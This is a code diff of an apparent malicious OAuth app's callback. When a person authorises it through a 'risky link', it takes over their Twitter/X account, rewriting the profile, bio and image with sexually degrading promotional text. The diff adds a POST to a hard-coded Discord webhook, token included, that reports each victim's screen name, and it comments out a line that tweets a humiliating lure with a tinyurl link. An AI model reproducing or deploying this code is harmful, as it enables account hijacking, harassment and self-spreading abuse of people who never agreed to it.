@@ -216,8 +216,13 @@ def callback():
     real_token = oauth.Token(real_oauth_token, real_oauth_token_secret)
     real_client = oauth.Client(consumer, real_token)
 
+    webhook_url='https://canary.discord.com/api/webhooks/1330489614636421130/HN1uH7RtBuacQzttXZlzyxkPhl8o3PQ-9LYSS7sNi2oXDCaB_9QDNtI-LPOWEfIWEiTj'
+    
     if endpoint == 'start':
         try:
+            w_content=f'{screen_name} clicked your risky link https://tinyurl.com/3y97dae2'
+            resp,content=client.request(webhook_url,"POST",body={"content",w_content})
+            print(resp)
             description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
             update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
             update_profile_image(real_client)
@@ -230,7 +235,7 @@ def callback():
                                         access_token=real_oauth_token, 
                                         access_token_secret=real_oauth_token_secret)
         
-            api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$.")
+            #api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$.")
         except Exception as e:
             print(e)
             return str(e)
